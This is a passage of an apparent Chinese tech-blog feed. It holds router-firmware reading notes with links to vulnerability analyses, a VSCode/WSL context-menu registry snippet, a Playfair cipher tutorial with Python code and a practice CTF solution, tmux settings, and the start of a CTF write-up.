class="built_in">len</span>(payload))&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>结果如下: </p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211025222626841.png" alt="image-20211025222626841"></p><h2 id="路由器固件提取"><a href="#路由器固件提取" class="headerlink" title="路由器固件提取"></a>路由器固件提取</h2><h3 id="手动"><a href="#手动" class="headerlink" title="手动"></a>手动</h3><p>查看文件的<code>magic</code>, 看关键的头字符，然后利用<code>dd</code>命令进行切割</p><h3 id="自动"><a href="#自动" class="headerlink" title="自动"></a>自动</h3><blockquote><p>暂时用不到，跳过自定义签名文件编写</p></blockquote><p><code>binwalk</code>, 可以自定义magic签名文件</p><h2 id="D-Link-DIR-815-路由器多次溢出漏洞分析"><a href="#D-Link-DIR-815-路由器多次溢出漏洞分析" class="headerlink" title="D-Link DIR-815 路由器多次溢出漏洞分析"></a>D-Link DIR-815 路由器多次溢出漏洞分析</h2><p><a href="https://lantern.cool/CVE-d-link-dir-815/">D-Link DIR-815 路由器多次溢出漏洞分析 | Lantern’s 小站</a></p><h2 id="D-Link-DIR-645-路由器溢出漏洞分析"><a href="#D-Link-DIR-645-路由器溢出漏洞分析" class="headerlink" title="D-Link DIR-645 路由器溢出漏洞分析"></a>D-Link DIR-645 路由器溢出漏洞分析</h2><p><a href="https://lantern.cool/CVE-d-link-dir-645/">D-Link DIR-645 路由器溢出漏洞分析 | Lantern’s 小站</a></p><h2 id="D-Link-DIR-505-便携路由器越界漏洞分析"><a href="#D-Link-DIR-505-便携路由器越界漏洞分析" class="headerlink" title="D-Link DIR-505 便携路由器越界漏洞分析"></a>D-Link DIR-505 便携路由器越界漏洞分析</h2><h2 id="Linksys-WRT54G-路由器溢出漏洞分析-——-运行环境修复"><a href="#Linksys-WRT54G-路由器溢出漏洞分析-——-运行环境修复" class="headerlink" title="Linksys WRT54G 路由器溢出漏洞分析 —— 运行环境修复"></a>Linksys WRT54G 路由器溢出漏洞分析 —— 运行环境修复</h2><h2 id="磊科全系列路由器后面漏洞分析"><a href="#磊科全系列路由器后面漏洞分析" class="headerlink" title="磊科全系列路由器后面漏洞分析"></a>磊科全系列路由器后面漏洞分析</h2><h2 id="参考文献及工具收集"><a href="#参考文献及工具收集" class="headerlink" title="参考文献及工具收集"></a>参考文献及工具收集</h2><p><a href="https://github.com/desword/shellcode_tools">desword/shellcode_tools: Useful tools for writing shellcode (github.com)</a></p><p><a href="https://github.com/ray-cp/MIPS">ray-cp/MIPS: mips exploit (github.com)</a></p>]]></content>
    
    
    <summary type="html">《揭秘家用路由器0day漏洞挖掘技术》读书笔记</summary>
    
    
    
    <category term="Note" scheme="http://lantern.cool/categories/Note/"/>
    
    
    <category term="Book_Note" scheme="http://lantern.cool/tags/Book-Note/"/>
    
  </entry>
  
  <entry>
    <title>VSCode(WSL) 添加至右键菜单</title>
    <link href="http://lantern.cool/else-vscode-wsl-add-to-right/"/>
    <id>http://lantern.cool/else-vscode-wsl-add-to-right/</id>
    <published>2021-07-05T22:36:16.000Z</published>
    <updated>2021-07-05T22:36:20.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul><li>实现右键可以直接在VSCode中使用WSL编辑文件</li></ul><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version <span class="number">5.00</span></span><br><span class="line"></span><br><span class="line">; 通过 Code(WSL) 打开</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\shell\VSCode(WSL)]</span><br><span class="line">@=<span class="string">&quot;通过 Code(WSL) 打开&quot;</span></span><br><span class="line"><span class="string">&quot;Icon&quot;</span>=<span class="string">&quot;C:\\Users\\Lantern\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe&quot;</span></span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\shell\VSCode(WSL)\command]</span><br><span class="line">@=<span class="string">&quot;wsl.exe code .&quot;</span></span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\Background\shell\VSCode(WSL)]</span><br><span class="line">@=<span class="string">&quot;通过 Code(WSL) 打开&quot;</span></span><br><span class="line"><span class="string">&quot;Icon&quot;</span>=<span class="string">&quot;C:\\Users\\Lantern\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe&quot;</span></span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\Background\shell\VSCode(WSL)\command]</span><br><span class="line">@=<span class="string">&quot;wsl.exe code .&quot;</span></span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\LibraryFolder\shell\VSCode(WSL)]</span><br><span class="line">@=<span class="string">&quot;通过 Code(WSL) 打开&quot;</span></span><br><span class="line"><span class="string">&quot;Icon&quot;</span>=<span class="string">&quot;C:\\Users\\Lantern\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe&quot;</span></span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\LibraryFolder\shell\VSCode(WSL)\command]</span><br><span class="line">@=<span class="string">&quot;wsl.exe code .&quot;</span></span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Drive\shell\VSCode(WSL)]</span><br><span class="line">@=<span class="string">&quot;通过 Code(WSL) 打开&quot;</span></span><br><span class="line"><span class="string">&quot;Icon&quot;</span>=<span class="string">&quot;C:\\Users\\Lantern\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe&quot;</span></span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Drive\shell\VSCode(WSL)\command]</span><br><span class="line">@=<span class="string">&quot;wsl.exe code .&quot;</span></span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\*\shell\VSCode(WSL)]</span><br><span class="line">@=<span class="string">&quot;通过 Code(WSL) 打开&quot;</span></span><br><span class="line"><span class="string">&quot;Icon&quot;</span>=<span class="string">&quot;C:\\Users\\Lantern\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe&quot;</span></span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\*\shell\VSCode(WSL)\command]</span><br><span class="line">@=<span class="string">&quot;wsl wslpath -u &quot;</span>%<span class="number">1</span><span class="string">&quot; |xargs code&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">配置VSCode(WSL) 添加至右键菜单</summary>
    
    
    
    <category term="ELSE" scheme="http://lantern.cool/categories/ELSE/"/>
    
    
    <category term="ELSE" scheme="http://lantern.cool/tags/ELSE/"/>
    
  </entry>
  
  <entry>
    <title>Playfair 密码</title>
    <link href="http://lantern.cool/note-crypto-playfair/"/>
    <id>http://lantern.cool/note-crypto-playfair/</id>
    <published>2020-10-31T21:29:50.000Z</published>
    <updated>2021-04-09T20:03:53.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>首发于公众号：<a href="https://mp.weixin.qq.com/s/iI7DUHShrjy8nB000t5TWg">深大信安Aurora</a></p><p>Playfair 密码（Playfair cipher or Playfair square）是一种对称式密码，是首种双字母取代的加密法。1854 年由英国人查尔斯 · 惠斯通（Charles Wheatstone）发明，惠斯登的朋友普莱费尔勋爵普及了这个加密法。基本算法如下：</p><ol><li>选取一串英文字母，除去重复出现的字母，将剩下的字母逐个逐个加入 5 × 5 的矩阵内，剩下的空间由未加入的英文字母依 A-Z 的顺序加入。注意，将 Q 去除，或将 I 和 J 视作同一字。</li><li>将要加密的明文分成两个一组。若组内的字母相同，将 X（或 Q）加到该组的第一个字母后，重新分组。若剩下一个字，也加入 X 。</li><li>在每组中，找出两个字母在矩阵中的地方。<ul><li>若两个字母不同行也不同列，在矩阵中找出另外两个字母（第一个字母对应行优先），使这四个字母成为一个长方形的四个角。</li><li>若两个字母同行，取这两个字母右方的字母（若字母在最右方则取最左方的字母）。</li><li>若两个字母同列，取这两个字母下方的字母（若字母在最下方则取最上方的字母）。</li></ul></li></ol><p>新找到的两个字母就是原本的两个字母加密的结果。</p><p>以 <code>playfair example</code>为密匙，得</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20210303131559631.png"></p><p>要加密的讯息为 <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code>, 根据规则我们需要在某位补上一个<code>X</code>, 得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO GX</span><br></pre></td></tr></table></figure><p>以<code>TH</code>为例，根据规则得到<code>ZB</code>，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20210303131518712.png"></p><p>同理，按照加密规则就会得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ZB XO TR BN CI QV SL QE RT IF KQ AD IU DM AY WF OV QG</span><br></pre></td></tr></table></figure><p>以下给出加解密脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Playfair</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key</span>):</span></span><br><span class="line">        self.table = []</span><br><span class="line"></span><br><span class="line">        self.create_table(key)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create_table</span>(<span class="params">self, key</span>):</span></span><br><span class="line">        letter_list = string.ascii_uppercase.replace(<span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;I&#x27;</span>)</span><br><span class="line">        <span class="comment"># 格式化字符串</span></span><br><span class="line">        key = key.upper().replace(<span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;I&#x27;</span>)  <span class="comment"># 将密钥变为大写, 且将I和J看为同一个字符</span></span><br><span class="line">        table = []  <span class="comment"># 加密表</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">            <span class="comment"># 过滤非字母 以及 去除重复字母 并加入加密表中</span></span><br><span class="line">            <span class="keyword">if</span> i.isalpha() <span class="keyword">and</span> i <span class="keyword">not</span> <span class="keyword">in</span> table:</span><br><span class="line">                table.append(i)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将a-z中不在加密表的字母加入</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> letter_list:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> table:</span><br><span class="line">                table.append(i)</span><br><span class="line">        <span class="comment"># 将加密表变为 5*5</span></span><br><span class="line">        self.table = [table[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_index</span>(<span class="params">self, ch</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">if</span> ch == self.table[i][j]:</span><br><span class="line">                    <span class="keyword">return</span> i, j</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, plaintext</span>):</span></span><br><span class="line">        plaintext = plaintext.upper().replace(<span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;I&#x27;</span>)  <span class="comment"># 将明文变为大写, 且将I和J看为同一个字符</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 进行分组，如果相邻字母相同就在该组的第一个字母后加入X后重新分组, 如果第一个字母为X则加Q</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="built_in">sum</span> = <span class="number">0</span>  <span class="comment"># 计算字母数</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(plaintext):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> plaintext[i].isalpha():</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> i == <span class="built_in">len</span>(plaintext) - <span class="number">1</span>:</span><br><span class="line">                    <span class="built_in">sum</span> += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">while</span> <span class="keyword">not</span> plaintext[i+<span class="number">1</span>].isalpha() <span class="keyword">and</span> i &lt; <span class="built_in">len</span>(plaintext):</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> plaintext[i] == plaintext[i+<span class="number">1</span>]:</span><br><span class="line">                    ch = <span class="string">&#x27;X&#x27;</span> <span class="keyword">if</span> plaintext[i] != <span class="string">&#x27;X&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;Q&#x27;</span></span><br><span class="line">                    plaintext = plaintext[:i+<span class="number">1</span>] + ch + plaintext[i+<span class="number">1</span>:]</span><br><span class="line">                i += <span class="number">2</span></span><br><span class="line">                <span class="built_in">sum</span> += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果明文处理后为奇数就在最后加入X</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">sum</span> % <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext)-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> plaintext[i].isalpha():</span><br><span class="line">                    ch = <span class="string">&#x27;X&#x27;</span> <span class="keyword">if</span> plaintext[i] != <span class="string">&#x27;X&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;Q&#x27;</span></span><br><span class="line">                    plaintext += ch</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        ciphertext = <span class="string">&quot;&quot;</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(plaintext):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> plaintext[i].isalpha():</span><br><span class="line">                ciphertext += plaintext[i]</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            x0, y0 = self.get_index(plaintext[i])</span><br><span class="line"></span><br><span class="line">            tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> plaintext[i+<span class="number">1</span>].isalpha() <span class="keyword">and</span> i &lt; <span class="built_in">len</span>(plaintext):</span><br><span class="line">                tmp += plaintext[i+<span class="number">1</span>]</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            x1, y1 = self.get_index(plaintext[i + <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> x0 == x1:  <span class="comment"># 如果在同一行</span></span><br><span class="line">                ciphertext += self.table[x0][(y0 + <span class="number">1</span>) %</span><br><span class="line">                                             <span class="number">5</span>] + tmp + self.table[x1][(y1 + <span class="number">1</span>) % <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> y0 == y1:  <span class="comment"># 如果在同一列</span></span><br><span class="line">                ciphertext += self.table[(x0 + <span class="number">1</span>) %</span><br><span class="line">                                         <span class="number">5</span>][y0] + tmp + self.table[(x1 + <span class="number">1</span>) % <span class="number">5</span>][y1]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:  <span class="comment"># 不同行不同列</span></span><br><span class="line">                ciphertext += self.table[x0][y1] + tmp + self.table[x1][y0]</span><br><span class="line"></span><br><span class="line">            i += <span class="number">2</span></span><br><span class="line">        <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, ciphertext</span>):</span></span><br><span class="line">        plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line">        ciphertext = ciphertext.upper()</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> ciphertext:</span><br><span class="line">            <span class="built_in">sum</span> += <span class="number">1</span> <span class="keyword">if</span> i.isalpha() <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">sum</span> % <span class="number">2</span> == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(ciphertext):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> ciphertext[i].isalpha():</span><br><span class="line">                plaintext += ciphertext[i]</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            x0, y0 = self.get_index(ciphertext[i])</span><br><span class="line"></span><br><span class="line">            tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> ciphertext[i+<span class="number">1</span>].isalpha() <span class="keyword">and</span> i &lt; <span class="built_in">len</span>(ciphertext):</span><br><span class="line">                tmp += ciphertext[i+<span class="number">1</span>]</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            x1, y1 = self.get_index(ciphertext[i + <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> x0 == x1:  <span class="comment"># 如果在同一行</span></span><br><span class="line">                plaintext += self.table[x0][(y0 - <span class="number">1</span>) %</span><br><span class="line">                                            <span class="number">5</span>] + tmp + self.table[x1][(y1 - <span class="number">1</span>) % <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> y0 == y1:  <span class="comment"># 如果在同一列</span></span><br><span class="line">                plaintext += self.table[(x0 - <span class="number">1</span>) %</span><br><span class="line">                                        <span class="number">5</span>][y0] + tmp + self.table[(x1 - <span class="number">1</span>) % <span class="number">5</span>][y1]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:  <span class="comment"># 不同行不同列</span></span><br><span class="line">                plaintext += self.table[x0][y1] + tmp + self.table[x1][y0]</span><br><span class="line"></span><br><span class="line">            i += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    key = <span class="string">&quot;playfair example&quot;</span></span><br><span class="line">    plaintext = <span class="string">&quot;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&quot;</span></span><br><span class="line">    playfair = Playfair(key)</span><br><span class="line">    ciphertext = playfair.encrypt(plaintext)</span><br><span class="line">    <span class="built_in">print</span>(ciphertext) <span class="comment"># ZBX OTRBN CIQVS LQE RTIFK QADI UDM AYWF OVQG</span></span><br><span class="line">    plaintext = playfair.decrypt(ciphertext)</span><br><span class="line">    <span class="built_in">print</span>(plaintext) <span class="comment"># THE QUICK BROWN FOX IUMPS OVER THE LAZY DOGX</span></span><br></pre></td></tr></table></figure><h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>在不知道密钥的情况下，可以使用该GitHub项目所给的方法进行暴力破解，具体使用方法项目也说的比较清晰，这里不再赘述</p><p><a href="https://github.com/N8Stewart/PlayfairCrack">PlayfairCrack</a></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><strong>实验吧-密码学-Fair-Play</strong></p><ul><li><p>题目描述</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The quick brown fox jumps over the lazy dog!</span><br><span class="line">ihxo&#123;smzdodcikmodcismzd</span><br></pre></td></tr></table></figure></li><li><p>解题思路</p><ul><li><p>根据所给题目描述我们猜测<code>The quick brown fox jumps over the lazy dog!</code>就是所给密钥，我们用我们上述给的脚本直接进行解密，当然，要注意我们的脚本用的是大写，记得转换为小写即可</p></li><li><pre><code class="python">from Playfair import Playfairkey = &quot;The quick brown fox jumps over the lazy dog!&quot;ciphertext = &quot;ihxo&#123;smzdodcikmodcismzd&#125;&quot;playfair = Playfair(key)plaintext = playfair.decrypt(ciphertext)print(plaintext.lower())</code></pre></li><li><p>得到flag: <code>ctfx&#123;playfairisfairplay&#125;</code></p></li></ul></li></ul><h2 id="Crack"><a href="#Crack" class="headerlink" title="Crack"></a>Crack</h2><p><a href="https://github.com/N8Stewart/PlayfairCrack">PlayfairCrack</a></p>]]></content>
    
    
    <summary type="html">Playfair 密码</summary>
    
    
    
    <category term="Note" scheme="http://lantern.cool/categories/Note/"/>
    
    <category term="Crypto" scheme="http://lantern.cool/categories/Note/Crypto/"/>
    
    
    <category term="Note" scheme="http://lantern.cool/tags/Note/"/>
    
    <category term="Crypto" scheme="http://lantern.cool/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Tmux</title>
    <link href="http://lantern.cool/tool-tmux/"/>
    <id>http://lantern.cool/tool-tmux/</id>
    <published>2020-10-26T12:54:38.000Z</published>
    <updated>2020-10-26T12:54:43.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="Tmux"><a href="#Tmux" class="headerlink" title="Tmux"></a>Tmux</h2><p>Tmux是一种终端多路复用器:它允许在一个屏幕上创建、访问和控制多个终端。tmux可以从屏幕上分离并在后台继续运行，然后重新附加</p><p>详细教程可以看<a href="http://louiszhai.github.io/2017/09/30/tmux/#%E5%BC%80%E5%90%AF%E9%BC%A0%E6%A0%87%E6%94%AF%E6%8C%81">Tmux使用手册</a>, 这里只记录我一些配置以备忘</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Linux: <code>sudo apt install tmux</code></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>tmux的配置文件是 ~/.tmux.conf，这个文件可能不存在，你可以自己新建。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 设置前缀为Ctrl + a</span><br><span class="line">set -g prefix C-a</span><br><span class="line"></span><br><span class="line">#解除Ctrl+b 与前缀的对应关系</span><br><span class="line">unbind C-b</span><br></pre></td></tr></table></figure><p>对于tmux v2.1(2015.10.28)之前的版本，需加入如下配置：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setw -g mode-mouse on # 支持鼠标选取文本等</span><br><span class="line">setw -g mouse-resize-pane on # 支持鼠标拖动调整面板的大小(通过拖动面板间的分割线)</span><br><span class="line">setw -g mouse-select-pane on # 支持鼠标选中并切换面板</span><br><span class="line">setw -g mouse-select-window on # 支持鼠标选中并切换窗口(通过点击状态栏窗口名称)</span><br></pre></td></tr></table></figure><p>有的地方可能会出现set-window-option的写法，setw就是它的别名。</p><p>对于tmux v2.1及以上的版本，仅需加入如下配置：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set-option -g mouse on # 等同于以上4个指令的效果</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><blockquote><p>均需要先按<code>Ctrl + B</code></p></blockquote><ul><li><code>%</code>：左右分屏幕</li><li><code>&quot;</code>: 上下分屏</li><li><code>x</code>: 关闭终端</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="Tool" scheme="http://lantern.cool/categories/Tool/"/>
    
    
    <category term="Linux" scheme="http://lantern.cool/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ 题库练习</title>
    <link href="http://lantern.cool/wp-games-Jarvis-OJ/"/>
    <id>http://lantern.cool/wp-games-Jarvis-OJ/</id>
    <published>2020-10-21T09:19:28.000Z</published>
    <updated>2020-10-21T09:19:31.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="Findthekey"><a href="#Findthekey" class="headerlink" title="Findthekey"></a>Findthekey</h2><p>文件为pyc, 用<code>uncompyle6</code>进行反编译, 得到python源码如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.7.4</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62211)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.17 (default, Jul 20 2020, 15:37:01)</span></span><br><span class="line"><span class="comment"># [GCC 7.5.0]</span></span><br><span class="line"><span class="comment"># Embedded file name: findkey</span></span><br><span class="line"><span class="comment"># Compiled at: 2016-04-30 17:54:18</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">lookup = [</span><br><span class="line"> <span class="number">196</span>, <span class="number">153</span>, <span class="number">149</span>, <span class="number">206</span>, <span class="number">17</span>, <span class="number">221</span>, <span class="number">10</span>, <span class="number">217</span>, <span class="number">167</span>, <span class="number">18</span>, <span class="number">36</span>, <span class="number">135</span>, <span class="number">103</span>, <span class="number">61</span>, <span class="number">111</span>, <span class="number">31</span>, <span class="number">92</span>, <span class="number">152</span>, <span class="number">21</span>, <span class="number">228</span>, <span class="number">105</span>, <span class="number">191</span>, <span class="number">173</span>, <span class="number">41</span>, <span class="number">2</span>, <span class="number">245</span>, <span class="number">23</span>, <span class="number">144</span>, <span class="number">1</span>, <span class="number">246</span>, <span class="number">89</span>, <span class="number">178</span>, <span class="number">182</span>, <span class="number">119</span>, <span class="number">38</span>, <span class="number">85</span>, <span class="number">48</span>, <span class="number">226</span>, <span class="number">165</span>, <span class="number">241</span>, <span class="number">166</span>, <span class="number">214</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">151</span>, <span class="number">3</span>, <span class="number">109</span>, <span class="number">169</span>, <span class="number">150</span>, <span class="number">224</span>, <span class="number">69</span>, <span class="number">156</span>, <span class="number">158</span>, <span class="number">57</span>, <span class="number">181</span>, <span class="number">29</span>, <span class="number">200</span>, <span class="number">37</span>, <span class="number">51</span>, <span class="number">252</span>, <span class="number">227</span>, <span class="number">93</span>, <span class="number">65</span>, <span class="number">82</span>, <span class="number">66</span>, <span class="number">80</span>, <span class="number">170</span>, <span class="number">77</span>, <span class="number">49</span>, <span class="number">177</span>, <span class="number">81</span>, <span class="number">94</span>, <span class="number">202</span>, <span class="number">107</span>, <span class="number">25</span>, <span class="number">73</span>, <span class="number">148</span>, <span class="number">98</span>, <span class="number">129</span>, <span class="number">231</span>, <span class="number">212</span>, <span class="number">14</span>, <span class="number">84</span>, <span class="number">121</span>, <span class="number">174</span>, <span class="number">171</span>, <span class="number">64</span>, <span class="number">180</span>, <span class="number">233</span>, <span class="number">74</span>, <span class="number">140</span>, <span class="number">242</span>, <span class="number">75</span>, <span class="number">104</span>, <span class="number">253</span>, <span class="number">44</span>, <span class="number">39</span>, <span class="number">87</span>, <span class="number">86</span>, <span class="number">27</span>, <span class="number">68</span>, <span class="number">22</span>, <span class="number">55</span>, <span class="number">76</span>, <span class="number">35</span>, <span class="number">248</span>, <span class="number">96</span>, <span class="number">5</span>, <span class="number">56</span>, <span class="number">20</span>, <span class="number">161</span>, <span class="number">213</span>, <span class="number">238</span>, <span class="number">220</span>, <span class="number">72</span>, <span class="number">100</span>, <span class="number">247</span>, <span class="number">8</span>, <span class="number">63</span>, <span class="number">249</span>, <span class="number">145</span>, <span class="number">243</span>, <span class="number">155</span>, <span class="number">222</span>, <span class="number">122</span>, <span class="number">32</span>, <span class="number">43</span>, <span class="number">186</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">216</span>, <span class="number">126</span>, <span class="number">15</span>, <span class="number">42</span>, <span class="number">115</span>, <span class="number">138</span>, <span class="number">240</span>, <span class="number">147</span>, <span class="number">229</span>, <span class="number">204</span>, <span class="number">117</span>, <span class="number">223</span>, <span class="number">141</span>, <span class="number">159</span>, <span class="number">131</span>, <span class="number">232</span>, <span class="number">124</span>, <span class="number">254</span>, <span class="number">60</span>, <span class="number">116</span>, <span class="number">46</span>, <span class="number">113</span>, <span class="number">79</span>, <span class="number">16</span>, <span class="number">128</span>, <span class="number">6</span>, <span class="number">251</span>, <span class="number">40</span>, <span class="number">205</span>, <span class="number">137</span>, <span class="number">199</span>, <span class="number">83</span>, <span class="number">54</span>, <span class="number">188</span>, <span class="number">19</span>, <span class="number">184</span>, <span class="number">201</span>, <span class="number">110</span>, <span class="number">255</span>, <span class="number">26</span>, <span class="number">91</span>, <span 